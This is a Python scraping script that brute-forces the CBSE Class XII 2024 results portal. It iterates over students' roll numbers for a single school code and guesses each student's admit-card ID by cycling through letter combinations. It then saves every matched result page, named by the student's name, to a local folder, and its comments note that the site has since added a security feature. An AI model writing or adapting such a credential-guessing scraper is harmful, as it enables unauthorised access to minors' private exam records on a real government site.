#LAST TIME I CHECKED: link 1 doesn't work as they've added a security feature, Link 2 doesn't work because the webpage is no longer functioning
import mechanicalsoup, re

browser = mechanicalsoup.StatefulBrowser()

#Link1: https://cbseresults.nic.in/class_xii_2023/ClassTwelfth_c_2023.htm
#Link2: https://testservices.nic.in/cbseresults/class_xii_2023/ClassTwelfth_c_2023.htm


#2024 Batch:
#LINK1: https://testservices.nic.in/cbseresults/class_xii_a_2024/ClassTwelfth_c_2024.htm
#LINK2: https://cbseresults.nic.in/class_xiith_a_2024/ClassTwelfth_c_2024.htm
#LINK3: https://cnr.nic.in/ResultDir/class_xii_a_2024/ClassTwelfth_c_2024.htm

def checker(regno, s_alpha, browser):
    m_alphas = 'SARMPKDNBCHTJGLVEYFIOWQUXZ'
    for m_alpha in m_alphas:
        print('Trying:', s_alpha+m_alpha+str(regno)[-3:-1]+'5571')
        fast_link = 'https://cbseresults.nic.in/class_xiith_a_2024/ClassTwelfth_c_2024.htm'
        third_link = 'https://cnr.nic.in/ResultDir/class_xii_a_2024/ClassTwelfth_c_2024.htm'
        browser.open(fast_link)
        browser.select_form()
        browser['regno'] = regno
        browser['sch'] = '55043'
        browser['admid'] = s_alpha+m_alpha+str(regno)[-3:-1]+'5571'
        response = browser.submit_selected()
        t = response.text
        if str(regno) in t:
            compiler = re.compile('Candidate Name.*?</tr>', re.DOTALL)
            short_t = compiler.findall(t)[0]
            # print('short t: ', short_t) #DEBUG
            compiler = re.compile('<b>[A-Z\s.]+<')
            name = compiler.findall(short_t)[0][3:-1]
            print('Obtained Results of:', name)
            fil = r'C:\Users\asilk\CODING_FILES\python_programs\CBSE_RESULTS\storage'+'\\'+name+'.html'
            #C:\Users\asilk\CODING_FILES\python_programs\CBSE_RESULTS\storage
            with open(fil, 'w', encoding='utf-8') as f:
                f.write(t)        
            return True      

alphabets = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
s_alpha_index = 19 #!CHANGE THIS TO A
#CBSE 2023: Start 20624155, Finish: 20624278
# Predict 1st: 20615426

for regno in range(20615487, 20615426+130):
    s_alpha = alphabets[s_alpha_index]
    while not checker(regno, s_alpha, browser):
        print('Testing: ', regno, s_alpha) #DEBUG
        s_alpha_index += 1
        s_alpha = alphabets[s_alpha_index]
        print('Changing first letter to', s_alpha)
        if s_alpha_index == 25:
            s_alpha_index = 0
            s_alpha = 'A'
